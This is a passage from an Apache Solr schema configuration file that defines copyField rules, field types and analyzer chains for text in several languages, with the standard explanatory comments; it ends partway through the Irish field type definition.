<uniqueKey>id</uniqueKey>\n\n <!-- DEPRECATED: The defaultSearchField is consulted by various query parsers when\n  parsing a query string that isn't explicit about the field.  Machine (non-user)\n  generated queries are best made explicit, or they can use the \"df\" request parameter\n  which takes precedence over this.\n  Note: Un-commenting defaultSearchField will be insufficient if your request handler\n  in solrconfig.xml defines \"df\", which takes precedence. That would need to be removed.\n <defaultSearchField>text</defaultSearchField> -->\n\n <!-- DEPRECATED: The defaultOperator (AND|OR) is consulted by various query parsers\n  when parsing a query string to determine if a clause of the query should be marked as\n  required or optional, assuming the clause isn't already marked by some operator.\n  The default is OR, which is generally assumed so it is not a good idea to change it\n  globally here.  The \"q.op\" request parameter takes precedence over this.\n <solrQueryParser defaultOperator=\"OR\"/> -->\n\n  <!-- copyField commands copy one field to another at the time a document\n        is added to the index.  It's used either to index the same field differently,\n        or to add multiple fields to the same field for easier/faster searching.  -->\n\n   <copyField source=\"cat\" dest=\"text\"/>\n   <copyField source=\"name\" dest=\"text\"/>\n   <copyField source=\"manu\" dest=\"text\"/>\n   <copyField source=\"features\" dest=\"text\"/>\n   <copyField source=\"includes\" dest=\"text\"/>\n   <copyField source=\"manu\" dest=\"manu_exact\"/>\n\n   <!-- Copy the price into a currency enabled field (default USD) -->\n   <copyField source=\"price\" dest=\"price_c\"/>\n\n   <!-- Text fields from SolrCell to search by default in our catch-all field -->\n   <copyField source=\"title\" dest=\"text\"/>\n   <copyField source=\"author\" dest=\"text\"/>\n   <copyField source=\"description\" dest=\"text\"/>\n   <copyField source=\"keywords\" dest=\"text\"/>\n   <copyField source=\"content\" dest=\"text\"/>\n   <copyField source=\"content_type\" dest=\"text\"/>\n   <copyField source=\"resourcename\" dest=\"text\"/>\n   <copyField source=\"url\" dest=\"text\"/>\n\n   <!-- Create a string version of author for faceting -->\n   <copyField source=\"author\" dest=\"author_s\"/>\n\n   <!-- Above, multiple source fields are copied to the [text] field.\n    Another way to map multiple source fields to the same\n    destination field is to use the dynamic field syntax.\n    copyField also supports a maxChars to copy setting.  -->\n\n   <!-- <copyField source=\"*_t\" dest=\"text\" maxChars=\"3000\"/> -->\n\n   <!-- copy name to alphaNameSort, a field designed for sorting by name -->\n   <!-- <copyField source=\"name\" dest=\"alphaNameSort\"/> -->\n\n  <types>\n    <!-- field type definitions. The \"name\" attribute is\n       just a label to be used by field definitions.  The \"class\"\n       attribute and any other attributes determine the real\n       behavior of the fieldType.\n         Class names starting with \"solr\" refer to java classes in a\n       standard package such as org.apache.solr.analysis\n    -->\n\n    <!-- The StrField type is not analyzed, but indexed/stored verbatim.\n       It supports doc values but in that case the field needs to be\n       single-valued and either required or have a default value.\n      -->\n    <fieldType name=\"string\" class=\"solr.StrField\" sortMissingLast=\"true\" />\n\n    <!-- boolean type: \"true\" or \"false\" -->\n    <fieldType name=\"boolean\" class=\"solr.BoolField\" sortMissingLast=\"true\"/>\n\n    <!-- sortMissingLast and sortMissingFirst attributes are optional attributes are\n         currently supported on types that are sorted internally as strings\n         and on numeric types.\n       This includes \"string\",\"boolean\", and, as of 3.5 (and 4.x),\n       int, float, long, date, double, including the \"Trie\" variants.\n       - If sortMissingLast=\"true\", then a sort on this field will cause documents\n         without the field to come after documents with the field,\n         regardless of the requested sort order (asc or desc).\n       - If sortMissingFirst=\"true\", then a sort on this field will cause documents\n         without the field to come before documents with the field,\n         regardless of the requested sort order.\n       - If sortMissingLast=\"false\" and sortMissingFirst=\"false\" (the default),\n         then default lucene sorting will be used which places docs without the\n         field first in an ascending sort and last in a descending sort.\n    -->\n\n    <!--\n      Default numeric field types. For faster range queries, consider the tint/tfloat/tlong/tdouble types.\n\n      These fields support doc values, but they require the field to be\n      single-valued and either be required or have a default value.\n    -->\n    <fieldType name=\"int\" class=\"solr.TrieIntField\" precisionStep=\"0\" positionIncrementGap=\"0\"/>\n    <fieldType name=\"float\" class=\"solr.TrieFloatField\" precisionStep=\"0\" positionIncrementGap=\"0\"/>\n    <fieldType name=\"long\" class=\"solr.TrieLongField\" precisionStep=\"0\" positionIncrementGap=\"0\"/>\n    <fieldType name=\"double\" class=\"solr.TrieDoubleField\" precisionStep=\"0\" positionIncrementGap=\"0\"/>\n\n    <!--\n     Numeric field types that index each value at various levels of precision\n     to accelerate range queries when the number of values between the range\n     endpoints is large. See the javadoc for NumericRangeQuery for internal\n     implementation details.\n\n     Smaller precisionStep values (specified in bits) will lead to more tokens\n     indexed per value, slightly larger index size, and faster range queries.\n     A precisionStep of 0 disables indexing at different precision levels.\n    -->\n    <fieldType name=\"tint\" class=\"solr.TrieIntField\" precisionStep=\"8\" positionIncrementGap=\"0\"/>\n    <fieldType name=\"tfloat\" class=\"solr.TrieFloatField\" precisionStep=\"8\" positionIncrementGap=\"0\"/>\n    <fieldType name=\"tlong\" class=\"solr.TrieLongField\" precisionStep=\"8\" positionIncrementGap=\"0\"/>\n    <fieldType name=\"tdouble\" class=\"solr.TrieDoubleField\" precisionStep=\"8\" positionIncrementGap=\"0\"/>\n\n    <!-- The format for this date field is of the form 1995-12-31T23:59:59Z, and\n         is a more restricted form of the canonical representation of dateTime\n         http://www.w3.org/TR/xmlschema-2/#dateTime\n         The trailing \"Z\" designates UTC time and is mandatory.\n         Optional fractional seconds are allowed: 1995-12-31T23:59:59.999Z\n         All other components are mandatory.\n\n         Expressions can also be used to denote calculations that should be\n         performed relative to \"NOW\" to determine the value, ie...\n\n               NOW/HOUR\n                  ... Round to the start of the current hour\n               NOW-1DAY\n                  ... Exactly 1 day prior to now\n               NOW/DAY+6MONTHS+3DAYS\n                  ... 6 months and 3 days in the future from the start of\n                      the current day\n\n         Consult the DateField javadocs for more information.\n\n         Note: For faster range queries, consider the tdate type\n      -->\n    <fieldType name=\"date\" class=\"solr.TrieDateField\" precisionStep=\"0\" positionIncrementGap=\"0\"/>\n\n    <!-- A Trie based date field for faster date range queries and date faceting. -->\n    <fieldType name=\"tdate\" class=\"solr.TrieDateField\" precisionStep=\"6\" positionIncrementGap=\"0\"/>\n\n\n    <!--Binary data type. The data should be sent/retrieved in as Base64 encoded Strings -->\n    <fieldtype name=\"binary\" class=\"solr.BinaryField\"/>\n\n    <!--\n      Note:\n      These should only be used for compatibility with existing indexes (created with lucene or older Solr versions).\n      Use Trie based fields instead. As of Solr 3.5 and 4.x, Trie based fields support sortMissingFirst/Last\n\n      Plain numeric field types that store and index the text\n      value verbatim (and hence don't correctly support range queries, since the\n      lexicographic ordering isn't equal to the numeric ordering)\n    -->\n    <fieldType name=\"pint\" class=\"solr.IntField\"/>\n    <fieldType name=\"plong\" class=\"solr.LongField\"/>\n    <fieldType name=\"pfloat\" class=\"solr.FloatField\"/>\n    <fieldType name=\"pdouble\" class=\"solr.DoubleField\"/>\n    <fieldType name=\"pdate\" class=\"solr.DateField\" sortMissingLast=\"true\"/>\n\n    <!-- The \"RandomSortField\" is not used to store or search any\n         data.  You can declare fields of this type it in your schema\n         to generate pseudo-random orderings of your docs for sorting\n         or function purposes.  The ordering is generated based on the field\n         name and the version of the index. As long as the index version\n         remains unchanged, and the same field name is reused,\n         the ordering of the docs will be consistent.\n         If you want different psuedo-random orderings of documents,\n         for the same version of the index, use a dynamicField and\n         change the field name in the request.\n     -->\n    <fieldType name=\"random\" class=\"solr.RandomSortField\" indexed=\"true\" />\n\n    <!-- solr.TextField allows the specification of custom text analyzers\n         specified as a tokenizer and a list of token filters. Different\n         analyzers may be specified for indexing and querying.\n\n         The optional positionIncrementGap puts space between multiple fields of\n         this type on the same document, with the purpose of preventing false phrase\n         matching across fields.\n\n         For more info on customizing your analyzer chain, please see\n         http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters\n     -->\n\n    <!-- One can also specify an existing Analyzer class that has a\n         default constructor via the class attribute on the analyzer element.\n         Example:\n    <fieldType name=\"text_greek\" class=\"solr.TextField\">\n      <analyzer class=\"org.apache.lucene.analysis.el.GreekAnalyzer\"/>\n    </fieldType>\n    -->\n\n    <!-- A text field that only splits on whitespace for exact matching of words -->\n    <fieldType name=\"text_ws\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.WhitespaceTokenizerFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- A general text field that has reasonable, generic\n         cross-language defaults: it tokenizes with StandardTokenizer,\n   removes stop words from case-insensitive \"stopwords.txt\"\n   (empty by default), and down cases.  At query time only, it\n   also applies synonyms. -->\n    <fieldType name=\"text_general\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer type=\"index\">\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"stopwords.txt\" />\n        <!-- in this example, we will only use synonyms at query time\n        <filter class=\"solr.SynonymFilterFactory\" synonyms=\"index_synonyms.txt\" ignoreCase=\"true\" expand=\"false\"/>\n        -->\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n      </analyzer>\n      <analyzer type=\"query\">\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"stopwords.txt\" />\n        <filter class=\"solr.SynonymFilterFactory\" synonyms=\"synonyms.txt\" ignoreCase=\"true\" expand=\"true\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- A text field with defaults appropriate for English: it\n         tokenizes with StandardTokenizer, removes English stop words\n         (lang/stopwords_en.txt), down cases, protects words from protwords.txt, and\n         finally applies Porter's stemming.  The query time analyzer\n         also applies synonyms from synonyms.txt. -->\n    <fieldType name=\"text_en\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer type=\"index\">\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <!-- in this example, we will only use synonyms at query time\n        <filter class=\"solr.SynonymFilterFactory\" synonyms=\"index_synonyms.txt\" ignoreCase=\"true\" expand=\"false\"/>\n        -->\n        <!-- Case insensitive stop word removal.\n        -->\n        <filter class=\"solr.StopFilterFactory\"\n                ignoreCase=\"true\"\n                words=\"lang/stopwords_en.txt\"\n                />\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n  <filter class=\"solr.EnglishPossessiveFilterFactory\"/>\n        <filter class=\"solr.KeywordMarkerFilterFactory\" protected=\"protwords.txt\"/>\n  <!-- Optionally you may want to use this less aggressive stemmer instead of PorterStemFilterFactory:\n        <filter class=\"solr.EnglishMinimalStemFilterFactory\"/>\n  -->\n        <filter class=\"solr.PorterStemFilterFactory\"/>\n      </analyzer>\n      <analyzer type=\"query\">\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.SynonymFilterFactory\" synonyms=\"synonyms.txt\" ignoreCase=\"true\" expand=\"true\"/>\n        <filter class=\"solr.StopFilterFactory\"\n                ignoreCase=\"true\"\n                words=\"lang/stopwords_en.txt\"\n                />\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n  <filter class=\"solr.EnglishPossessiveFilterFactory\"/>\n        <filter class=\"solr.KeywordMarkerFilterFactory\" protected=\"protwords.txt\"/>\n  <!-- Optionally you may want to use this less aggressive stemmer instead of PorterStemFilterFactory:\n        <filter class=\"solr.EnglishMinimalStemFilterFactory\"/>\n  -->\n        <filter class=\"solr.PorterStemFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- A text field with defaults appropriate for English, plus\n   aggressive word-splitting and autophrase features enabled.\n   This field is just like text_en, except it adds\n   WordDelimiterFilter to enable splitting and matching of\n   words on case-change, alpha numeric boundaries, and\n   non-alphanumeric chars.  This means certain compound word\n   cases will work, for example query \"wi fi\" will match\n   document \"WiFi\" or \"wi-fi\".\n        -->\n    <fieldType name=\"text_en_splitting\" class=\"solr.TextField\" positionIncrementGap=\"100\" autoGeneratePhraseQueries=\"true\">\n      <analyzer type=\"index\">\n        <tokenizer class=\"solr.WhitespaceTokenizerFactory\"/>\n        <!-- in this example, we will only use synonyms at query time\n        <filter class=\"solr.SynonymFilterFactory\" synonyms=\"index_synonyms.txt\" ignoreCase=\"true\" expand=\"false\"/>\n        -->\n        <!-- Case insensitive stop word removal.\n        -->\n        <filter class=\"solr.StopFilterFactory\"\n                ignoreCase=\"true\"\n                words=\"lang/stopwords_en.txt\"\n                />\n        <filter class=\"solr.WordDelimiterFilterFactory\" generateWordParts=\"1\" generateNumberParts=\"1\" catenateWords=\"1\" catenateNumbers=\"1\" catenateAll=\"0\" splitOnCaseChange=\"1\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.KeywordMarkerFilterFactory\" protected=\"protwords.txt\"/>\n        <filter class=\"solr.PorterStemFilterFactory\"/>\n      </analyzer>\n      <analyzer type=\"query\">\n        <tokenizer class=\"solr.WhitespaceTokenizerFactory\"/>\n        <filter class=\"solr.SynonymFilterFactory\" synonyms=\"synonyms.txt\" ignoreCase=\"true\" expand=\"true\"/>\n        <filter class=\"solr.StopFilterFactory\"\n                ignoreCase=\"true\"\n                words=\"lang/stopwords_en.txt\"\n                />\n        <filter class=\"solr.WordDelimiterFilterFactory\" generateWordParts=\"1\" generateNumberParts=\"1\" catenateWords=\"0\" catenateNumbers=\"0\" catenateAll=\"0\" splitOnCaseChange=\"1\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.KeywordMarkerFilterFactory\" protected=\"protwords.txt\"/>\n        <filter class=\"solr.PorterStemFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Less flexible matching, but less false matches.  Probably not ideal for product names,\n         but may be good for SKUs.  Can insert dashes in the wrong place and still match. -->\n    <fieldType name=\"text_en_splitting_tight\" class=\"solr.TextField\" positionIncrementGap=\"100\" autoGeneratePhraseQueries=\"true\">\n      <analyzer>\n        <tokenizer class=\"solr.WhitespaceTokenizerFactory\"/>\n        <filter class=\"solr.SynonymFilterFactory\" synonyms=\"synonyms.txt\" ignoreCase=\"true\" expand=\"false\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_en.txt\"/>\n        <filter class=\"solr.WordDelimiterFilterFactory\" generateWordParts=\"0\" generateNumberParts=\"0\" catenateWords=\"1\" catenateNumbers=\"1\" catenateAll=\"0\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.KeywordMarkerFilterFactory\" protected=\"protwords.txt\"/>\n        <filter class=\"solr.EnglishMinimalStemFilterFactory\"/>\n        <!-- this filter can remove any duplicate tokens that appear at the same position - sometimes\n             possible with WordDelimiterFilter in conjuncton with stemming. -->\n        <filter class=\"solr.RemoveDuplicatesTokenFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Just like text_general except it reverses the characters of\n   each token, to enable more efficient leading wildcard queries. -->\n    <fieldType name=\"text_general_rev\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer type=\"index\">\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"stopwords.txt\" />\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.ReversedWildcardFilterFactory\" withOriginal=\"true\"\n           maxPosAsterisk=\"3\" maxPosQuestion=\"2\" maxFractionAsterisk=\"0.33\"/>\n      </analyzer>\n      <analyzer type=\"query\">\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.SynonymFilterFactory\" synonyms=\"synonyms.txt\" ignoreCase=\"true\" expand=\"true\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"stopwords.txt\" />\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- charFilter + WhitespaceTokenizer  -->\n    <!--\n    <fieldType name=\"text_char_norm\" class=\"solr.TextField\" positionIncrementGap=\"100\" >\n      <analyzer>\n        <charFilter class=\"solr.MappingCharFilterFactory\" mapping=\"mapping-ISOLatin1Accent.txt\"/>\n        <tokenizer class=\"solr.WhitespaceTokenizerFactory\"/>\n      </analyzer>\n    </fieldType>\n    -->\n\n    <!-- This is an example of using the KeywordTokenizer along\n         With various TokenFilterFactories to produce a sortable field\n         that does not include some properties of the source text\n      -->\n    <fieldType name=\"alphaOnlySort\" class=\"solr.TextField\" sortMissingLast=\"true\" omitNorms=\"true\">\n      <analyzer>\n        <!-- KeywordTokenizer does no actual tokenizing, so the entire\n             input string is preserved as a single token\n          -->\n        <tokenizer class=\"solr.KeywordTokenizerFactory\"/>\n        <!-- The LowerCase TokenFilter does what you expect, which can be\n             when you want your sorting to be case insensitive\n          -->\n        <filter class=\"solr.LowerCaseFilterFactory\" />\n        <!-- The TrimFilter removes any leading or trailing whitespace -->\n        <filter class=\"solr.TrimFilterFactory\" />\n        <!-- The PatternReplaceFilter gives you the flexibility to use\n             Java Regular expression to replace any sequence of characters\n             matching a pattern with an arbitrary replacement string,\n             which may include back references to portions of the original\n             string matched by the pattern.\n\n             See the Java Regular Expression documentation for more\n             information on pattern and replacement string syntax.\n\n             http://java.sun.com/j2se/1.6.0/docs/api/java/util/regex/package-summary.html\n          -->\n        <filter class=\"solr.PatternReplaceFilterFactory\"\n                pattern=\"([^a-z])\" replacement=\"\" replace=\"all\"\n        />\n      </analyzer>\n    </fieldType>\n\n    <fieldtype name=\"phonetic\" stored=\"false\" indexed=\"true\" class=\"solr.TextField\" >\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.DoubleMetaphoneFilterFactory\" inject=\"false\"/>\n      </analyzer>\n    </fieldtype>\n\n    <fieldtype name=\"payloads\" stored=\"false\" indexed=\"true\" class=\"solr.TextField\" >\n      <analyzer>\n        <tokenizer class=\"solr.WhitespaceTokenizerFactory\"/>\n        <!--\n        The DelimitedPayloadTokenFilter can put payloads on tokens... for example,\n        a token of \"foo|1.4\"  would be indexed as \"foo\" with a payload of 1.4f\n        Attributes of the DelimitedPayloadTokenFilterFactory :\n         \"delimiter\" - a one character delimiter. Default is | (pipe)\n   \"encoder\" - how to encode the following value into a playload\n      float -> org.apache.lucene.analysis.payloads.FloatEncoder,\n      integer -> o.a.l.a.p.IntegerEncoder\n      identity -> o.a.l.a.p.IdentityEncoder\n            Fully Qualified class name implementing PayloadEncoder, Encoder must have a no arg constructor.\n         -->\n        <filter class=\"solr.DelimitedPayloadTokenFilterFactory\" encoder=\"float\"/>\n      </analyzer>\n    </fieldtype>\n\n    <!-- lowercases the entire field value, keeping it as a single token.  -->\n    <fieldType name=\"lowercase\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.KeywordTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\" />\n      </analyzer>\n    </fieldType>\n\n    <!--\n      Example of using PathHierarchyTokenizerFactory at index time, so\n      queries for paths match documents at that path, or in descendent paths\n    -->\n    <fieldType name=\"descendent_path\" class=\"solr.TextField\">\n      <analyzer type=\"index\">\n  <tokenizer class=\"solr.PathHierarchyTokenizerFactory\" delimiter=\"/\" />\n      </analyzer>\n      <analyzer type=\"query\">\n  <tokenizer class=\"solr.KeywordTokenizerFactory\" />\n      </analyzer>\n    </fieldType>\n    <!--\n      Example of using PathHierarchyTokenizerFactory at query time, so\n      queries for paths match documents at that path, or in ancestor paths\n    -->\n    <fieldType name=\"ancestor_path\" class=\"solr.TextField\">\n      <analyzer type=\"index\">\n  <tokenizer class=\"solr.KeywordTokenizerFactory\" />\n      </analyzer>\n      <analyzer type=\"query\">\n  <tokenizer class=\"solr.PathHierarchyTokenizerFactory\" delimiter=\"/\" />\n      </analyzer>\n    </fieldType>\n\n    <!-- since fields of this type are by default not stored or indexed,\n         any data added to them will be ignored outright.  -->\n    <fieldtype name=\"ignored\" stored=\"false\" indexed=\"false\" multiValued=\"true\" class=\"solr.StrField\" />\n\n    <!-- This point type indexes the coordinates as separate fields (subFields)\n      If subFieldType is defined, it references a type, and a dynamic field\n      definition is created matching *___<typename>.  Alternately, if\n      subFieldSuffix is defined, that is used to create the subFields.\n      Example: if subFieldType=\"double\", then the coordinates would be\n        indexed in fields myloc_0___double,myloc_1___double.\n      Example: if subFieldSuffix=\"_d\" then the coordinates would be indexed\n        in fields myloc_0_d,myloc_1_d\n      The subFields are an implementation detail of the fieldType, and end\n      users normally should not need to know about them.\n     -->\n    <fieldType name=\"point\" class=\"solr.PointType\" dimension=\"2\" subFieldSuffix=\"_d\"/>\n\n    <!-- A specialized field for geospatial search. If indexed, this fieldType must not be multivalued. -->\n    <fieldType name=\"location\" class=\"solr.LatLonType\" subFieldSuffix=\"_coordinate\"/>\n\n    <!-- An alternative geospatial field type new to Solr 4.  It supports multiValued and polygon shapes.\n      For more information about this and other Spatial fields new to Solr 4, see:\n      http://wiki.apache.org/solr/SolrAdaptersForLuceneSpatial4\n    -->\n    <fieldType name=\"location_rpt\" class=\"solr.SpatialRecursivePrefixTreeFieldType\"\n        geo=\"true\" distErrPct=\"0.025\" maxDistErr=\"0.000009\" units=\"degrees\" />\n\n   <!-- Money/currency field type. See http://wiki.apache.org/solr/MoneyFieldType\n        Parameters:\n          defaultCurrency: Specifies the default currency if none specified. Defaults to \"USD\"\n          precisionStep:   Specifies the precisionStep for the TrieLong field used for the amount\n          providerClass:   Lets you plug in other exchange provider backend:\n                           solr.FileExchangeRateProvider is the default and takes one parameter:\n                             currencyConfig: name of an xml file holding exchange rates\n                           solr.OpenExchangeRatesOrgProvider uses rates from openexchangerates.org:\n                             ratesFileLocation: URL or path to rates JSON file (default latest.json on the web)\n                             refreshInterval: Number of minutes between each rates fetch (default: 1440, min: 60)\n   -->\n    <fieldType name=\"currency\" class=\"solr.CurrencyField\" precisionStep=\"8\" defaultCurrency=\"USD\" currencyConfig=\"currency.xml\" />\n\n\n\n   <!-- some examples for different languages (generally ordered by ISO code) -->\n\n    <!-- Arabic -->\n    <fieldType name=\"text_ar\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <!-- for any non-arabic -->\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_ar.txt\" />\n        <!-- normalizes \ufeef to \ufef1, etc -->\n        <filter class=\"solr.ArabicNormalizationFilterFactory\"/>\n        <filter class=\"solr.ArabicStemFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Bulgarian -->\n    <fieldType name=\"text_bg\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_bg.txt\" />\n        <filter class=\"solr.BulgarianStemFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Catalan -->\n    <fieldType name=\"text_ca\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <!-- removes l', etc -->\n        <filter class=\"solr.ElisionFilterFactory\" ignoreCase=\"true\" articles=\"lang/contractions_ca.txt\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_ca.txt\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Catalan\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- CJK bigram (see text_ja for a Japanese configuration using morphological analysis) -->\n    <fieldType name=\"text_cjk\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <!-- normalize width before bigram, as e.g. half-width dakuten combine  -->\n        <filter class=\"solr.CJKWidthFilterFactory\"/>\n        <!-- for any non-CJK -->\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.CJKBigramFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Czech -->\n    <fieldType name=\"text_cz\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_cz.txt\" />\n        <filter class=\"solr.CzechStemFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Danish -->\n    <fieldType name=\"text_da\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_da.txt\" format=\"snowball\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Danish\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- German -->\n    <fieldType name=\"text_de\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_de.txt\" format=\"snowball\" />\n        <filter class=\"solr.GermanNormalizationFilterFactory\"/>\n        <filter class=\"solr.GermanLightStemFilterFactory\"/>\n        <!-- less aggressive: <filter class=\"solr.GermanMinimalStemFilterFactory\"/> -->\n        <!-- more aggressive: <filter class=\"solr.SnowballPorterFilterFactory\" language=\"German2\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Greek -->\n    <fieldType name=\"text_el\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <!-- greek specific lowercase for sigma -->\n        <filter class=\"solr.GreekLowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"false\" words=\"lang/stopwords_el.txt\" />\n        <filter class=\"solr.GreekStemFilterFactory\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Spanish -->\n    <fieldType name=\"text_es\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_es.txt\" format=\"snowball\" />\n        <filter class=\"solr.SpanishLightStemFilterFactory\"/>\n        <!-- more aggressive: <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Spanish\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Basque -->\n    <fieldType name=\"text_eu\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_eu.txt\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Basque\"/>\n      </analyzer>\n    </fieldType>\n\n    <!-- Persian -->\n    <fieldType name=\"text_fa\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <!-- for ZWNJ -->\n        <charFilter class=\"solr.PersianCharFilterFactory\"/>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.ArabicNormalizationFilterFactory\"/>\n        <filter class=\"solr.PersianNormalizationFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_fa.txt\" />\n      </analyzer>\n    </fieldType>\n\n    <!-- Finnish -->\n    <fieldType name=\"text_fi\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_fi.txt\" format=\"snowball\" />\n        <filter class=\"solr.SnowballPorterFilterFactory\" language=\"Finnish\"/>\n        <!-- less aggressive: <filter class=\"solr.FinnishLightStemFilterFactory\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- French -->\n    <fieldType name=\"text_fr\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <!-- removes l', etc -->\n        <filter class=\"solr.ElisionFilterFactory\" ignoreCase=\"true\" articles=\"lang/contractions_fr.txt\"/>\n        <filter class=\"solr.LowerCaseFilterFactory\"/>\n        <filter class=\"solr.StopFilterFactory\" ignoreCase=\"true\" words=\"lang/stopwords_fr.txt\" format=\"snowball\" />\n        <filter class=\"solr.FrenchLightStemFilterFactory\"/>\n        <!-- less aggressive: <filter class=\"solr.FrenchMinimalStemFilterFactory\"/> -->\n        <!-- more aggressive: <filter class=\"solr.SnowballPorterFilterFactory\" language=\"French\"/> -->\n      </analyzer>\n    </fieldType>\n\n    <!-- Irish -->\n    <fieldType name=\"text_ga\" class=\"solr.TextField\" positionIncrementGap=\"100\">\n      <analyzer>\n        <tokenizer class=\"solr.StandardTokenizerFactory\"/>\n        <!-- removes d', etc -->\n        <filter class=\"solr.ElisionFilterFactory\" ignoreCase=\"true\" 